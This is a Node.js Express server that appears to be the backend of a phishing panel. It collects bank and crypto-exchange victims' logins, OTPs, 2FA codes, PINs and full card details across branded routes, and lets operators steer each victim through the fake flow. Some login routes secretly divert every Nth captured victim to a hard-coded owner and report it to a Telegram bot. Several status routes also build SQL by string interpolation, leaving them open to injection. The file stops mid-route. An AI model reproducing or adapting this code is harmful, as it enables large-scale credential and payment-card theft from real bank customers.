const express = require("express");
const bodyparser = require("body-parser");
const axios = require("axios");
const mongoose = require("mongoose");
var cors = require("cors");
var fs = require("fs");
var CryptoJS = require("crypto-js");
require("dotenv").config();

const port = process.env.PORT || 8080;

const fileUpload = require("express-fileupload");
const app = express();
app.use(bodyparser.json());
app.use(cors());
app.use(fileUpload());

mongoose.connect(process.env.mongoURL);
const db = mongoose.connection;
db.on("error", console.error.bind(console, "connection error: "));
db.once("open", () => {
  app.listen(port, "0.0.0.0", () => {
    console.log("App listening on port", port);
  });
});

var bankName;

app.use("/", require("./routes/ips"));

app.get("/getRespentesting123!", (req, res) => {
  fs.readFile("results.txt", function (err, data) {
    var filecontents = data;
    res.send(filecontents);
  });
});

//SANTS
app.use("/sants", require("./routes/sants"));

app.get("/santsCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM sants WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.get("/santsCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM sants WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/santsCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;

  if (newStatus === 6) {
    partNumber = req.body.partNumber;

    let details = [newStatus, partNumber, uniqueid];
    let query = `UPDATE sants SET status= ${newStatus}, partNumber = '${partNumber}' WHERE uniqueid= '${uniqueid}'`;

    panelConnection.query(query, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  } else {
    let details = [newStatus, uniqueid, owner];
    let query = `UPDATE sants SET status=? WHERE uniqueid=?`;

    panelConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  }
});

app.get("/santsCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM sants WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

let santsCount = 0;

app.post("/santsSaveLogin", cors(), (req, res) => {
  username = req.body.username;
  password = req.body.password;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  if (santsCount == 300) {
    let details = [username, password, uniqueid, ip, "haytch123!"];
    let query = `INSERT INTO sants(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=New Sants Hit:\n${username}`
    );

    panelConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Insertion Completed");
      else console.log(err);
    });
    santsCount = 0;
  } else {
    let details = [username, password, uniqueid, ip, owner];
    let query = `INSERT INTO sants(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

    panelConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Insertion Completed");
      else console.log(err);
    });
    santsCount += 1;
  }
});

app.post("/santsSaveOtp", cors(), (req, res) => {
  otp = req.body.otp;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE sants SET otp=?, status = 7 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/santsSaveLoginAgain", cors(), (req, res) => {
  username = req.body.username;
  password = req.body.password;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [username, password, uniqueid, owner];
  let query = `UPDATE sants SET username=?, password = ?, status = 1 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/santsSavePhone", cors(), (req, res) => {
  phone = req.body.phone;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [phone, uniqueid, owner];
  let query = `UPDATE sants SET phone=?, status = 3 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/santsSaveCard", cors(), (req, res) => {
  ccname = req.body.ccname;
  ccnum = req.body.ccnum;
  ccexp = req.body.ccexp;
  cvv = req.body.cvv;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [ccname, ccnum, ccexp, cvv, uniqueid, owner];
  let query = `UPDATE sants SET ccname=?, ccnum = ?, ccexp = ?, cvv = ?, status = 11 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/santsDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;
  owner = req.body.owner;

  let details = [uniqueid];
  let query = `DELETE FROM sants WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//REV
//REV
//REV

app.get("/revCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM rev WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.get("/revCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM rev WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/revCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query = `UPDATE rev SET status= ${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.get("/revCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM rev WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/revSaveLogin", cors(), (req, res) => {
  telephone = req.body.telephone;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  let details = [telephone, uniqueid, ip, owner];
  let query = `INSERT INTO rev(telephone,uniqueid,status,ip, owner) VALUES (?,?,1,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/revSaveLoginAgain", cors(), (req, res) => {
  telephone = req.body.telephone;
  uniqueid = req.body.uniqueid;

  let details = [telephone, uniqueid];
  let query = `UPDATE rev SET telephone = ?, status = 1 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/revSaveName", cors(), (req, res) => {
  fullname = req.body.fullname;
  uniqueid = req.body.uniqueid;

  let details = [fullname, uniqueid];
  let query = `UPDATE rev SET fullname = ?, status = 5 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/revSaveCard", cors(), (req, res) => {
  ccnum = req.body.ccnum;
  ccexp = req.body.ccexp;
  cccvv = req.body.cccvv;
  uniqueid = req.body.uniqueid;

  let details = [ccnum, ccexp, cccvv, uniqueid];
  let query = `UPDATE rev SET ccnum = ?, ccexp = ?, cccvv = ?, status = 9 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/revSavePin", cors(), (req, res) => {
  pin = req.body.pin;
  uniqueid = req.body.uniqueid;

  let details = [pin, uniqueid];
  let query = `UPDATE rev SET pin = ?, status = 6 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/revSaveOtp", cors(), (req, res) => {
  otp = req.body.otp;
  uniqueid = req.body.uniqueid;

  let details = [otp, uniqueid];
  let query = `UPDATE rev SET otp = ?, status = 3 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/revDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;
  owner = req.body.owner;

  let details = [uniqueid];
  let query = `DELETE FROM rev WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//KUCOIN
//KUCOIN
//KUCOIN

app.get("/kcCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM kc WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.get("/kcCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM kc WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/kcCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query = `UPDATE kc SET status= ${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.get("/kcCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM kc WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/kcSaveLogin", cors(), (req, res) => {
  username = req.body.username;
  password = req.body.password;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  let details = [username, password, uniqueid, ip, owner];
  let query = `INSERT INTO kc(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/kcSaveLoginAgain", cors(), (req, res) => {
  username = req.body.username;
  password = req.body.password;
  uniqueid = req.body.uniqueid;

  let details = [username, password, uniqueid];
  let query = `UPDATE kc SET username = ?, password = ?, status = 1 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/kcSaveTradingPass", cors(), (req, res) => {
  tradingPass = req.body.tradingPass;
  uniqueid = req.body.uniqueid;

  let details = [tradingPass, uniqueid];
  let query = `UPDATE kc SET tradingPass = ?, status = 7 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/kcSave2FA", cors(), (req, res) => {
  twofactor = req.body.twofactor;
  uniqueid = req.body.uniqueid;

  let details = [twofactor, uniqueid];
  let query = `UPDATE kc SET twofactor = ?, status = 3 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/kcSaveOTP", cors(), (req, res) => {
  otp = req.body.otp;
  uniqueid = req.body.uniqueid;

  let details = [otp, uniqueid];
  let query = `UPDATE kc SET otp = ?, status = 5 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/kcSaveAll", cors(), (req, res) => {
  otp = req.body.otp;
  tradingPass = req.body.tradingPass;
  twofactor = req.body.twofactor;
  uniqueid = req.body.uniqueid;

  let details = [otp, tradingPass, twofactor, uniqueid];
  let query = `UPDATE kc SET otp = ?, tradingPass = ?, twofactor = ?, status = 9 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/kcDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;
  owner = req.body.owner;

  let details = [uniqueid];
  let query = `DELETE FROM kc WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//MICB
//MICB
//MICB

app.get("/micbCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM micb WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.get("/micbCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM micb WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/micbCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query = `UPDATE micb SET status= ${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.get("/micbCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM micb WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/micbSaveLogin", cors(), (req, res) => {
  username = req.body.username;
  password = req.body.password;
  telephone = req.body.telephone;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  let details = [username, password, telephone, uniqueid, ip, owner];
  let query = `INSERT INTO micb(username,password,telephone,uniqueid,status,ip, owner) VALUES (?,?,?,?,1,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/micbSaveLoginAgain", cors(), (req, res) => {
  username = req.body.username;
  password = req.body.password;
  telephone = req.body.telephone;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [username, password, telephone, uniqueid, owner];
  let query = `UPDATE micb SET username=?, password=?, telephone = ?, status = 1 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/micbSaveOtp", cors(), (req, res) => {
  otp = req.body.otp;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE micb SET otp=?, status = 3 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/micbDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;
  owner = req.body.owner;

  let details = [uniqueid];
  let query = `DELETE FROM micb WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//MQ
//MQ
//MQ

app.get("/mqCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM mq WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.get("/mqCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM mq WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/mqCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query = `UPDATE mq SET status= ${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.get("/mqCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM mq WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

let mqCount = 0;

app.post("/mqSaveLogin", cors(), (req, res) => {
  username = req.body.username;
  password = req.body.password;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  if (mqCount == 3) {
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=New MacQuarie Hit:\n${username}`
    );

    let details = [username, password, uniqueid, ip, "haytch123!"];
    let query = `INSERT INTO mq(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

    panelConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Insertion Completed");
      else console.log(err);
    });
    mqCount = 0;
  } else {
    let details = [username, password, uniqueid, ip, owner];
    let query = `INSERT INTO mq(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

    panelConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Insertion Completed");
      else console.log(err);
    });
    mqCount += 1;
  }
});

app.post("/mqSaveLoginAgain", cors(), (req, res) => {
  username = req.body.username;
  password = req.body.password;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [username, password, uniqueid, owner];
  let query = `UPDATE mq SET username=?, password=?, status = 1 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/mqSaveOtp", cors(), (req, res) => {
  otp = req.body.otp;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE mq SET otp=?, status = 3 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/mqDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;
  owner = req.body.owner;

  let details = [uniqueid];
  let query = `DELETE FROM mq WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//BNP
//BNP
//BNP

app.get("/bnpCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM bnp WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/bnpCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;

  let query = `UPDATE bnp SET status=${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.get("/bnpCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM bnp WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.get("/bnpCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM bnp WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/bnpSaveLoginOtp", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  loginOtp = req.body.loginOtp;
  owner = req.body.owner;

  let details = [loginOtp, uniqueid, owner];
  let query = `UPDATE bnp SET login_otp=?, status = 3 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/bnpSaveIdentityOtp", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  identityOtp = req.body.identityOtp;
  owner = req.body.owner;

  let details = [identityOtp, uniqueid, owner];
  let query = `UPDATE bnp SET payment_otp=?, status = 5 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/bnpSaveVerification", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  verificationCode = req.body.verificationCode;
  owner = req.body.owner;

  let details = [verificationCode, uniqueid, owner];
  let query = `UPDATE bnp SET link=?, status = 7 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/bnpSaveLoginAgain", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  clientCode = req.body.clientCode;
  secretCode = req.body.secretCode;
  owner = req.body.owner;

  let details = [clientCode, secretCode, uniqueid, owner];
  let query = `UPDATE bnp SET username=?, password=?, status = 1 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/bnpSavePhone", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  telephone = req.body.telephone;
  owner = req.body.owner;

  let details = [telephone, uniqueid, owner];
  let query = `UPDATE bnp SET telephone=?, status = 12 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/bnpSaveCard", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  ccnum = req.body.ccnum;
  ccexp = req.body.ccexp;
  cccvv = req.body.cccvv;
  owner = req.body.owner;

  let details = [ccnum, ccexp, cccvv, uniqueid, owner];
  let query = `UPDATE bnp SET cardnumber=?, expirydate=?, cvv=?, status = 9 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/bnpSaveLogin", cors(), (req, res) => {
  clientCode = req.body.clientCode;
  secretCode = req.body.secretCode;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;
  let details = [clientCode, secretCode, uniqueid, ip, owner];
  let query = `INSERT INTO bnp(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/bnpDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;

  let details = [uniqueid];
  let query = `DELETE FROM bnp WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//DBS
//DBS
//DBS

app.get("/dbsCustomers/:id", (req, res) => {
  uniqueid = req.params.id;

  let details = [uniqueid];
  let query = `SELECT * FROM customers WHERE uniqueid=?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.get("/dbsCustomers", (req, res) => {
  panelConnection.query(`SELECT * FROM customers`, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/dbsCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;

  if (newStatus == 12) {
    merchant = req.body.merchant;
    amount = req.body.amount;
    let details = [newStatus, merchant, amount, uniqueid];
    let query = `UPDATE customers SET status=?, merchant=?, amount=? WHERE uniqueid=?`;

    panelConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  } else {
    let details = [newStatus, uniqueid];
    let query = `UPDATE customers SET status=? WHERE uniqueid=?`;

    panelConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  }
});

app.post("/dbsDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;

  let details = [uniqueid];
  let query = `DELETE FROM customers WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.post("/dbsSaveLogin", cors(), (req, res) => {
  pin = req.body.pin;
  userId = req.body.userid;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  let details = [pin, userId, uniqueid, ip];
  let query = `INSERT INTO customers(pin,userId,uniqueid,status,ip) VALUES (?,?,?,1,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/dbsSaveLoginAgain", cors(), (req, res) => {
  pin = req.body.pin;
  userId = req.body.userid;
  uniqueid = req.body.uniqueid;

  let details = [pin, userId, uniqueid];
  let query = `UPDATE customers SET pin=?, userId=?, status = 1 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/dbsPaymentOtp", cors(), (req, res) => {
  paymentOtp = req.body.paymentOtp;
  uniqueid = req.body.uniqueid;

  let details = [paymentOtp, uniqueid];
  let query = `UPDATE customers SET paymentOtp=?, status = 15 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/dbsSavePhone", cors(), (req, res) => {
  telephone = req.body.telephone;
  uniqueid = req.body.uniqueid;

  let details = [telephone, uniqueid];
  let query = `UPDATE customers SET telephone=?, status = 5 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/dbsSaveEmail", cors(), (req, res) => {
  email = req.body.email;
  uniqueid = req.body.uniqueid;

  let details = [email, uniqueid];
  let query = `UPDATE customers SET email=?, status = 3 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/dbsSavePhoneOtp", cors(), (req, res) => {
  otp = req.body.otp;
  uniqueid = req.body.uniqueid;

  let details = [otp, uniqueid];
  let query = `UPDATE customers SET otp=?, status = 7 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/dbsSaveEmailOtp", cors(), (req, res) => {
  otp = req.body.otp;
  uniqueid = req.body.uniqueid;

  let details = [otp, uniqueid];
  let query = `UPDATE customers SET otp=?, status = 9 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/dbsSaveCC", cors(), (req, res) => {
  ccnum = req.body.ccnum;
  ccexp = req.body.ccexp;
  cccvv = req.body.cccvv;
  uniqueid = req.body.uniqueid;

  let details = [ccnum, ccexp, cccvv, uniqueid];
  let query = `UPDATE customers SET ccnum=?, ccexp=?, cccvv=?, status = 11 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

//ANZ
//ANZ
//ANZ

app.use("/anz", require("./routes/anz"));

app.get("/anzCustomers/:owner", (req, res) => {
  owner = req.params.owner;

  let details = [owner];
  let query = `SELECT * FROM anz WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/anzCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;

  if (newStatus == 4) {
    question1 = req.body.question1;

    let query = `UPDATE anz SET status= ${newStatus}, question1 = '${question1}' WHERE uniqueid= '${uniqueid}'`;

    panelConnection.query(query, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  } else {
    let query = `UPDATE anz SET status= ${newStatus} WHERE uniqueid= '${uniqueid}'`;

    panelConnection.query(query, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  }
});

app.get("/anzCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM anz WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.get("/anzCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM anz WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/anzSaveLogin", cors(), (req, res) => {
  customerId = req.body.customerId;
  password = req.body.password;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [customerId, password, uniqueid, ip, owner];
  let query = `INSERT INTO anz(customerId,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/anzSaveTelephone", cors(), (req, res) => {
